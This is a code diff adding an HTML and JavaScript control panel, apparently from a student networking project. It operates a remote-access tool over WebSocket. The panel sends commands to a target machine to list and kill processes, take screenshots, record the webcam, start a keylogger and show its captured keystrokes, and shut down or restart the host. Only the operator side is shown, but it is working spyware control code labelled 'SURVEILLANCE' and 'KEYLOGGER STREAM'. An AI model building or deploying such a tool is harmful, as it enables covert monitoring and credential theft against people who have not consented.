@@ -1,0 +1,174 @@
+
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <title>SHADOW_ROOT_ACCESS</title>
+    <style>
+        :root { --bg: #050505; --panel: #111; --border: #333; --accent: #ff0000; --text: #ccc; }
+        body { background: var(--bg); color: var(--text); font-family: 'Consolas', monospace; margin: 0; padding: 10px; height: 100vh; overflow: hidden; font-size: 11px; box-sizing: border-box; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr 320px; grid-template-rows: 50px 1fr 200px; gap: 10px; height: 100%; }
+        .box { background: var(--panel); border: 1px solid var(--border); padding: 10px; display: flex; flex-direction: column; overflow: hidden; }
+        .box:hover { border-color: var(--accent); }
+        .box h3 { margin: 0 0 10px 0; color: var(--accent); border-bottom: 1px solid var(--accent); padding-bottom: 5px; font-size: 12px; font-weight: bold; letter-spacing: 1px; }
+        .header { grid-column: 1 / -1; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--accent); background: #000; }
+        .title { font-size: 20px; font-weight: bold; color: var(--accent); }
+        .ctrl-group { display: flex; gap: 5px; margin-bottom: 5px; }
+        input { background: #111; border: 1px solid #444; color: #fff; padding: 4px; flex: 1; text-align: center; font-family: inherit; font-size: 11px; }
+        input:focus { border-color: var(--accent); outline: none; }
+        button { background: #151515; color: #888; border: 1px solid #444; padding: 4px 10px; cursor: pointer; font-weight: bold; transition: 0.2s; font-family: inherit; font-size: 10px; width: 60px; }
+        button:hover { border-color: var(--accent); color: var(--accent); }
+        button.refresh { width: 100%; margin-bottom: 8px; color: #ddd; }
+        button.stop { color: #a00; border-color: #500; }
+        button.danger { background: #300; color: red; border-color: red; width: 100%; margin-top:5px; }
+        .scroll-box { flex: 1; overflow-y: auto; background: #000; border: 1px solid #222; padding: 5px; }
+        .scroll-box::-webkit-scrollbar { width: 5px; } 
+        .scroll-box::-webkit-scrollbar-thumb { background: var(--accent); }
+        table { width: 100%; border-collapse: collapse; } 
+        td { padding: 3px; border-bottom: 1px solid #222; white-space: nowrap; } 
+        tr:hover { background: #222; color: #fff; cursor: pointer; }
+        .pid { color: var(--accent); width: 50px; font-weight: bold; }
+        #media-view { flex: 1; border: 1px dashed #444; background: #000; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        img { max-width: 100%; max-height: 100%; object-fit: contain; }
+    </style>
+</head>
+<body>
+    <div class='grid'>
+        <div class='box header'>
+            <div class='title'>/// DO AN MANG MAY TINH ///</div>
+            <div id='status' style='color:#555'>STATUS: DISCONNECTED</div>
+        </div>
+
+        <div class='box'>
+            <h3>[1] APPLICATIONS</h3>
+            <button class='refresh' onclick="send('LIST_APPS')">REFRESH LIST</button>
+            <div class='ctrl-group'><input id='appNameStart' placeholder='App Name...'><button onclick="startApp('appNameStart')">START</button></div>
+            <div class='ctrl-group'><input id='appPidStop' placeholder='PID to Stop...'><button class='stop' onclick="stopApp('appPidStop')">STOP</button></div>
+            <div class='scroll-box' id='list-apps'></div>
+        </div>
+
+        <div class='box'>
+            <h3>[2] PROCESSES</h3>
+            <button class='refresh' onclick="send('LIST_PROCS')">REFRESH LIST</button>
+            <div class='ctrl-group'><input id='procNameStart' placeholder='Proc Name...'><button onclick="startApp('procNameStart')">START</button></div>
+            <div class='ctrl-group'><input id='procPidStop' placeholder='PID to Stop...'><button class='stop' onclick="stopApp('procPidStop')">STOP</button></div>
+            <div class='scroll-box' id='list-procs'></div>
+        </div>
+
+        <div class='box' style='grid-row: span 2'>
+            <h3>SURVEILLANCE</h3>
+            <div style='display:flex; gap:5px; margin-bottom:5px'>
+                <button onclick="send('SCREENSHOT')" style='flex:1; width:auto'>SNAP</button>
+                <button onclick="recWebcam()" id='btnCam' style='flex:1; width:auto; color:yellow'>REC 10s</button>
+            </div>
+            <div id='media-view'>NO SIGNAL</div>
+            
+            <div style='margin-top:auto; padding-top:10px; border-top:1px solid #333'>
+                <label style='color:red; font-size:9px'>POWER OPS</label>
+                <div style='display:flex; gap:5px'>
+                    <button class='danger' onclick="if(confirm('SHUTDOWN?')) send('SHUTDOWN')">OFF</button>
+                    <button class='danger' onclick="if(confirm('RESTART?')) send('RESTART')" style='color:orange; border-color:orange'>RST</button>
+                </div>
+                <div style='margin-top:10px'>
+                    <input id='ip' value='127.0.0.1' style='width:96%; margin-bottom:5px'>
+                    <button onclick='connect()' style='width:100%'>CONNECT</button>
+                </div>
+            </div>
+        </div>
+
+        <div class='box' style='grid-column: span 2'>
+            <div style='display:flex; justify-content:space-between; align-items:center; margin-bottom:5px'>
+                <h3>[3] KEYLOGGER STREAM</h3>
+                <button id='btnKey' onclick="toggleKeylog()" style='width:150px; color:#0ff; border-color:#0ff'>START KEYLOG</button>
+            </div>
+            <div id='terminal' class='scroll-box' style='font-family:monospace; color:#0f0; border:none'>
+                <div>[SYS] Ready.</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var ws; 
+        var term = document.getElementById('terminal');
+        var isKeylogging = false;
+
+        function log(msg, type) {
+            var color = (type=='KEY') ? '#0ff' : '#0f0';
+            term.innerHTML += '<div><span style=\'color:'+color+'\'>> ' + msg + '</span></div>';
+            term.scrollTop = term.scrollHeight;
+        }
+
+        function connect() {
+            var ip = document.getElementById('ip').value;
+            ws = new WebSocket('ws://' + ip + ':8080');
+            log('Connecting to ' + ip + '...');
+            
+            ws.onopen = function() {
+                document.getElementById('status').innerText = 'STATUS: CONNECTED';
+                document.getElementById('status').style.color = '#0f0';
+                log('CONNECTED.');
+            };
+            ws.onmessage = function(e) {
+                var d = e.data;
+                if(d.startsWith('IMG|')) {
+                    document.getElementById('media-view').innerHTML = '<img src=\'data:image/jpeg;base64,' + d.substring(4) + '\'>';
+                }
+                else if(d.startsWith('LIST_APPS|')) renderList(d.substring(10), 'list-apps', 'appPidStop');
+                else if(d.startsWith('LIST_PROCS|')) renderList(d.substring(11), 'list-procs', 'procPidStop');
+                else if(d.startsWith('KEYLOG|')) {
+                    log('CAPTURED CONTENT:', 'KEY');
+                    log(d.substring(7), 'KEY');
+                }
+                else log(d);
+            };
+        }
+
+        function send(c) { if(ws && ws.readyState==1) ws.send(c); else log('Error: Not Connected'); }
+        function startApp(id) { var n = document.getElementById(id).value; if(n) { send('START|'+n); log('Start: '+n); } }
+        function stopApp(id) { var p = document.getElementById(id).value; if(p) { send('KILL|'+p); log('Kill PID: '+p); } }
+        
+        function recWebcam() { 
+            send('WEBCAM_START'); 
+            log('Streaming video (10s)...');
+            var btn = document.getElementById('btnCam');
+            btn.disabled = true;
+            btn.innerText = 'REC...';
+            setTimeout(function() { btn.disabled = false; btn.innerText = 'REC 10s'; }, 10000);
+        }
+
+        function toggleKeylog() {
+            var btn = document.getElementById('btnKey');
+            if (!isKeylogging) {
+                send('KEYLOG_START');
+                isKeylogging = true;
+                btn.innerText = 'STOP & GET LOGS';
+                btn.style.color = 'yellow';
+                btn.style.borderColor = 'yellow';
+                log('Keylogger Started...', 'KEY');
+            } else {
+                send('KEYLOG_STOP');
+                isKeylogging = false;
+                btn.innerText = 'START KEYLOG';
+                btn.style.color = '#0ff';
+                btn.style.borderColor = '#0ff';
+                log('Fetching logs...', 'KEY');
+            }
+        }
+
+        function renderList(data, divId, inputId) {
+            var rows = data.split(';'); 
+            var html = '<table>';
+            html += '<tr style=\'color:#666\'><td style=\'width:50px\'>PID</td><td>NAME</td></tr>';
+            for(var i=0; i<rows.length; i++) {
+                var r = rows[i];
+                if(r) {
+                    var p = r.split(',');
+                    html += '<tr onclick="document.getElementById(\'' + inputId + '\').value=\'' + p[0] + '\'">';
+                    html += '<td class=\'pid\'>' + p[0] + '</td><td>' + p[1] + '</td></tr>';
+                }
+            }
+            document.getElementById(divId).innerHTML = html + '</table>';
+        }
+    </script>
+</body>
+</html>
